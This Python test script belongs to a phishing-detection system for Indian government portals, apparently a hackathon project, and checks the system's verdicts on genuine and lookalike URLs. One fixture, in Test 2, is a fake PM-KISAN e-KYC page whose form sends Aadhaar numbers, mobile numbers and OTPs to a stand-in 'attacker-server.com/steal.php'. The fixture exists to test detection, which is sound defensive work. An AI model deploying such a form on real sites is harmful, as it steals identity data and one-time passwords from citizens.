"""
GovShield Sentinel Grid — Automated Verification & Evaluation Suite
SIH 2026 Problem Statement SIH1454
"""

import sys
import os

# Set UTF-8 standard output encoding on Windows
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# Add backend directory to sys.path
backend_dir = os.path.join(os.path.dirname(__file__), "backend")
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)

from modules.lexical_analyzer import LexicalAnalyzer
from modules.dom_analyzer import DOMAnalyzer
from modules.visual_analyzer import VisualSimilarityAnalyzer
from modules.whois_analyzer import WhoisAnalyzer
from modules.fusion_engine import FusionEngine
from modules.certin_reporter import CertInReporter


def run_test_suite():
    print("=" * 65)
    print("[GOVSHIELD SENTINEL GRID] - TEST SUITE EXECUTION")
    print("=" * 65)

    lex_analyzer = LexicalAnalyzer()
    dom_analyzer = DOMAnalyzer()
    vis_analyzer = VisualSimilarityAnalyzer()
    whois_analyzer = WhoisAnalyzer()
    fusion_engine = FusionEngine()
    reporter = CertInReporter()

    # -------------------------------------------------------------
    # TEST 1: Genuine Government Portal (pmkisan.gov.in)
    # -------------------------------------------------------------
    print("\n[TEST 1] Evaluating Genuine Portal: https://pmkisan.gov.in")
    genuine_url = "https://pmkisan.gov.in"
    lex_res1 = lex_analyzer.analyze(genuine_url)
    dom_res1 = dom_analyzer.analyze_html(
        "<html><head><title>PM Kisan</title></head><body><h1>Official Government Scheme</h1></body></html>",
        genuine_url,
        lex_res1.get("target_entity_id")
    )
    vis_res1 = vis_analyzer.analyze_visual_lookalike(candidate_portal_id=lex_res1.get("target_entity_id"))
    whois_res1 = whois_analyzer.analyze(genuine_url)
    verdict1 = fusion_engine.evaluate(lex_res1, dom_res1, vis_res1, whois_res1)

    print(f"  * Verdict: {verdict1['verdict']} (Score: {verdict1['risk_score']}/100)")
    print(f"  * Summary: {verdict1['summary']}")
    assert verdict1["verdict"] == "LEGITIMATE", f"Expected LEGITIMATE, got {verdict1['verdict']}"
    assert verdict1["risk_score"] <= 10, f"Expected risk score <= 10, got {verdict1['risk_score']}"
    print("  [PASSED] TEST 1: Correctly whitelisted genuine portal.")

    # -------------------------------------------------------------
    # TEST 2: Zero-Day Lookalike Phishing Clone (pmkisan-kyc-update.xyz)
    # -------------------------------------------------------------
    print("\n[TEST 2] Evaluating Zero-Day Phishing Clone: http://pmkisan-kyc-update.xyz")
    phishing_url = "http://pmkisan-kyc-update.xyz"
    phishing_html = """
    <html>
      <head><title>PM-KISAN Samman Nidhi e-KYC</title></head>
      <body>
        <img src="https://pmkisan.gov.in/images/pmkisan_logo.png" />
        <form action="http://attacker-server.com/steal.php" method="POST">
          <input type="text" name="aadhaar_number" placeholder="Enter Aadhaar Number" />
          <input type="text" name="mobile_number" placeholder="Enter Mobile" />
          <input type="password" name="otp_code" placeholder="Enter OTP" />
          <button type="submit">Verify Now</button>
        </form>
      </body>
    </html>
    """
    lex_res2 = lex_analyzer.analyze(phishing_url)
    dom_res2 = dom_analyzer.analyze_html(
        phishing_html,
        phishing_url,
        lex_res2.get("target_entity_id")
    )
    vis_res2 = vis_analyzer.analyze_visual_lookalike(candidate_portal_id=lex_res2.get("target_entity_id"))
    whois_res2 = whois_analyzer.analyze(phishing_url)
    verdict2 = fusion_engine.evaluate(lex_res2, dom_res2, vis_res2, whois_res2)

    print(f"  * Target Entity: {verdict2['target_entity']}")
    print(f"  * Verdict: {verdict2['verdict']} (Risk Score: {verdict2['risk_score']}/100)")
    print(f"  * Threat Indicators ({len(verdict2['reasons'])}):")
    for r in verdict2["reasons"]:
        print(f"     - {r}")

    assert verdict2["verdict"] == "PHISHING_CLONE", f"Expected PHISHING_CLONE, got {verdict2['verdict']}"
    assert verdict2["risk_score"] >= 80, f"Expected risk score >= 80, got {verdict2['risk_score']}"
    assert "aadhaar_number" in [s["field"] for s in dom_res2["sensitive_inputs"]], "Failed to detect Aadhaar harvesting input"
    print("  [PASSED] TEST 2: Successfully detected zero-day phishing clone with high confidence.")

    # -------------------------------------------------------------
    # TEST 3: CERT-In Forensic Incident Dossier Generation
    # -------------------------------------------------------------
    print("\n[TEST 3] Generating CERT-In Incident Dossier Packet")
    verdict2["url"] = phishing_url
    dossier = reporter.create_incident_report(verdict2, {"source": "GovShield Automated Test Runner"})
    print(f"  * Incident ID: {dossier['incident_id']}")
    print(f"  * Threat Category: {dossier['threat_category']}")
    print(f"  * Takedown Recommendations: {len(dossier['mitigation_recommendations'])} actions")
    # -------------------------------------------------------------
    # TEST 4: Legitimate Commercial Web Platform (ChatGPT / OpenAI)
    # -------------------------------------------------------------
    print("\n[TEST 4] Evaluating Commercial Platform: https://chatgpt.com")
    chatgpt_url = "https://chatgpt.com"
    chatgpt_html = """
    <html>
      <head><title>ChatGPT - OpenAI</title></head>
      <body>
        <h1>Welcome to ChatGPT</h1>
        <form action="/login" method="POST">
          <input type="email" name="username" placeholder="Email address" />
          <input type="password" name="password" placeholder="Password" />
          <button type="submit">Continue</button>
        </form>
      </body>
    </html>
    """
    lex_res4 = lex_analyzer.analyze(chatgpt_url)
    dom_res4 = dom_analyzer.analyze_html(chatgpt_html, chatgpt_url, lex_res4.get("target_entity_id"))
    vis_res4 = vis_analyzer.analyze_visual_lookalike(candidate_portal_id=lex_res4.get("target_entity_id"))
    whois_res4 = whois_analyzer.analyze(chatgpt_url)
    verdict4 = fusion_engine.evaluate(lex_res4, dom_res4, vis_res4, whois_res4)

    print(f"  * Verdict: {verdict4['verdict']} (Score: {verdict4['risk_score']}/100)")
    print(f"  * Summary: {verdict4['summary']}")
    assert verdict4["verdict"] == "LEGITIMATE", f"Expected LEGITIMATE, got {verdict4['verdict']}"
    assert verdict4["risk_score"] == 0, f"Expected risk score 0 for ChatGPT, got {verdict4['risk_score']}"
    assert not verdict4["impersonated"], "ChatGPT should not be flagged as an impersonator"
    # -------------------------------------------------------------
    # TEST 5: Microsoft Bing Search Engine (https://www.bing.com)
    # -------------------------------------------------------------
    print("\n[TEST 5] Evaluating Search Engine: https://www.bing.com/search?q=bolt+ai")
    bing_url = "https://www.bing.com/search?q=bolt+ai"
    bing_html = """
    <html>
      <head><title>bolt ai - Search - Bing</title></head>
      <body>
        <input type="search" name="q" value="bolt ai" />
        <div>Search results for bolt ai...</div>
      </body>
    </html>
    """
    lex_res5 = lex_analyzer.analyze(bing_url)
    dom_res5 = dom_analyzer.analyze_html(bing_html, bing_url, lex_res5.get("target_entity_id"))
    vis_res5 = vis_analyzer.analyze_visual_lookalike(candidate_portal_id=lex_res5.get("target_entity_id"))
    whois_res5 = whois_analyzer.analyze(bing_url)
    verdict5 = fusion_engine.evaluate(lex_res5, dom_res5, vis_res5, whois_res5)

    print(f"  * Verdict: {verdict5['verdict']} (Score: {verdict5['risk_score']}/100)")
    print(f"  * Summary: {verdict5['summary']}")
    assert verdict5["verdict"] == "LEGITIMATE", f"Expected LEGITIMATE, got {verdict5['verdict']}"
    assert verdict5["risk_score"] == 0, f"Expected risk score 0 for Bing, got {verdict5['risk_score']}"
    assert not verdict5["impersonated"], "Bing should not be flagged as an impersonator"
    print("  [PASSED] TEST 5: Correctly verified Bing search engine as safe legitimate platform.")

    # -------------------------------------------------------------
    # TEST 6: Deceptive Lookalike Domain (https://income-tax-refund.example)
    # -------------------------------------------------------------
    print("\n[TEST 6] Evaluating Lookalike Domain: https://income-tax-refund.example")
    tax_url = "https://income-tax-refund.example"
    lex_res6 = lex_analyzer.analyze(tax_url)
    dom_res6 = dom_analyzer.analyze_html("", tax_url, lex_res6.get("target_entity_id"))
    vis_res6 = vis_analyzer.analyze_visual_lookalike(candidate_portal_id=lex_res6.get("target_entity_id"))
    whois_res6 = whois_analyzer.analyze(tax_url)
    verdict6 = fusion_engine.evaluate(lex_res6, dom_res6, vis_res6, whois_res6)

    print(f"  * Target Entity: {verdict6['target_entity']}")
    print(f"  * Verdict: {verdict6['verdict']} (Score: {verdict6['risk_score']}/100)")
    print(f"  * Summary: {verdict6['summary']}")
    assert verdict6["verdict"] == "PHISHING_CLONE", f"Expected PHISHING_CLONE, got {verdict6['verdict']}"
    assert verdict6["risk_score"] >= 80, f"Expected risk score >= 80, got {verdict6['risk_score']}"
    assert verdict6["impersonated"], "Expected impersonated = True"
    print("  [PASSED] TEST 6: Successfully detected income-tax-refund.example as critical phishing lookalike.")

    # -------------------------------------------------------------
    # TEST 7: GST Phishing Clone (https://gst-refund.example)
    # -------------------------------------------------------------
    print("\n[TEST 7] Evaluating GST Lookalike Domain: https://gst-refund.example")
    gst_url = "https://gst-refund.example"
    lex_res7 = lex_analyzer.analyze(gst_url)
    dom_res7 = dom_analyzer.analyze_html("", gst_url, lex_res7.get("target_entity_id"))
    vis_res7 = vis_analyzer.analyze_visual_lookalike(candidate_portal_id=lex_res7.get("target_entity_id"))
    whois_res7 = whois_analyzer.analyze(gst_url)
    verdict7 = fusion_engine.evaluate(lex_res7, dom_res7, vis_res7, whois_res7)

    print(f"  * Target Entity: {verdict7['target_entity']}")
    print(f"  * Verdict: {verdict7['verdict']} (Score: {verdict7['risk_score']}/100)")
    print(f"  * Summary: {verdict7['summary']}")
    assert verdict7["verdict"] == "PHISHING_CLONE", f"Expected PHISHING_CLONE, got {verdict7['verdict']}"
    assert verdict7["risk_score"] >= 80, f"Expected risk score >= 80, got {verdict7['risk_score']}"
    assert verdict7["impersonated"], "Expected impersonated = True"
    print("  [PASSED] TEST 7: Successfully detected gst-refund.example as critical zero-day phishing clone.")

    print("\n" + "=" * 65)
    print("ALL VERIFICATION TESTS COMPLETED SUCCESSFULLY (7/7)")
    print("=" * 65)


if __name__ == "__main__":
    run_test_suite()
